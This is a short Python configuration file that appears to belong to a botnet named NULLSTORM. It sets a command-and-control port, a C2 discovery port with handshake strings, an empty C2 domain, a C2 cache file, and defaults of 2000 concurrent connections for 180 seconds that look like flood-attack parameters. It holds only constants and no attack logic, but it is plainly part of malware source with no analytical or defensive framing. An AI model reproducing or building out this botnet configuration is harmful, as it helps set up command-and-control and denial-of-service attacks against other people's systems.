import socket
import os


C2_PORT = 4444
C2_DISCOVERY_PORT = 4445
C2_DISCOVERY_KEY = "NULLSTORM_DISCOVER"
C2_DISCOVERY_RESPONSE = "NULLSTORM_C2_HERE"


C2_DOMAIN = ""

DEFAULT_CONCURRENCY = 2000
DEFAULT_DURATION = 180

CACHE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_cache.txt")